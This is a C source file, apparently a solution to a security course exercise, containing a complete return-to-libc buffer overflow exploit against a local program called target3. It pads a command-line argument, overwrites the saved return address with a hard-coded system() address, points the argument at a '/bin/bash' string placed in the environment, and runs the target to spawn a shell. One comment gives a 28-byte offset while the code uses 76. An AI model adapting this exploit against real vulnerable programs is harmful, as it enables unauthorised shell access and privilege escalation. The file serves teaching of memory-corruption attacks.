#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/home/kxm180046/targets/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; 
  
  // exp
  //28 bytes required to overwrite eip, plus 1 for the final \0
  args[1] = malloc(89);
  int i;
  for (i = 0; i < 89; i++) {
    //overwrite the string with junk, to make sure there aren't any random 
    //terminators in the string that would stop strcpy()
    args[1][i] = 'A';
  }

  //overwrite the return address
  args[1][76] = '\x7c'; //system addr
  args[1][77] = '\xd9';
  args[1][78] = '\x05';
  args[1][79] = '\x40';

  args[1][80] = '\xff'; // argc attack
  args[1][81] = '\xff';
  args[1][82] = '\xff';
  args[1][83] = '\xff';

  args[1][84] = '\x59'; // "/bin/bash" place
  args[1][85] = '\xff'; 
  args[1][86] = '\xff';
  args[1][87] = '\xbf';
  

  args[1][88] = '\0'; //add terminating \0 to the string
  args[2] = NULL;

  env[0] = "/bin/bash";

  if (0 > execve(TARGET, args, env))
  {
    fprintf(stderr, "execve failed.\n");
  }

  return 0;
}
